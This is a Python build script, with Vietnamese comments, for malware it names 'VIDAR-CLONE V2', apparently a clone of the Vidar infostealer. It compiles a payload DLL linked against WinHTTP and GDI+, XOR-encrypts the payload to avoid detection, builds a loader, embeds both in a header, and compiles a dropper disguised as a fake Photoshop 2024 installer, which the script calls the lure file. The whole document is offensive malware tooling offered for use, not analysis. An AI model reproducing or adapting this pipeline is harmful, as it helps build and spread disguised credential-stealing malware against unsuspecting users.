import os, subprocess

def run_cmd(cmd):
    print(f"[*] {cmd}")
    subprocess.run(cmd, shell=True, check=True)

print("=== BUILDING VIDAR-CLONE V2 ===")

# 1. Compile Payload DLL
run_cmd("x86_64-w64-mingw32-g++ -shared -o payload.dll payload.cpp -lwinhttp -lgdiplus -lgdi32 -lshlwapi -static-libgcc -static-libstdc++")

# 2. Mã hóa Payload thành .dat (Không dùng Donut nữa)
print("[*] Encrypting Payload to .dat...")
key = [0xAA, 0xBB, 0xCC, 0xDD]
with open("payload.dll", "rb") as f:
    data = f.read()
enc_data = bytearray([b ^ key[i % len(key)] for i, b in enumerate(data)])
with open("payload.dat", "wb") as f:
    f.write(enc_data)

# 3. Compile Loader
run_cmd("x86_64-w64-mingw32-g++ -o sys_loader.exe loader.cpp -lshell32 -static-libgcc -static-libstdc++")

# 4. Đọc file
with open("sys_loader.exe", "rb") as f: loader_bin = f.read()
with open("payload.dat", "rb") as f: payload_bin = f.read()

# 5. Tạo header
with open("embedded.h", "w") as f:
    f.write(f"unsigned char loader_data[] = {{ {','.join([hex(b) for b in loader_bin])} }};\n")
    f.write(f"unsigned int loader_size = {len(loader_bin)};\n")
    f.write(f"unsigned char payload_data[] = {{ {','.join([hex(b) for b in payload_bin])} }};\n")
    f.write(f"unsigned int payload_size = {len(payload_bin)};\n")

# 6. Compile Dropper
run_cmd("x86_64-w64-mingw32-g++ -o Photoshop_2024_Setup.exe dropper.cpp -static-libgcc -static-libstdc++")

print("\n[+] SUCCESS! File mồi: Photoshop_2024_Setup.exe")
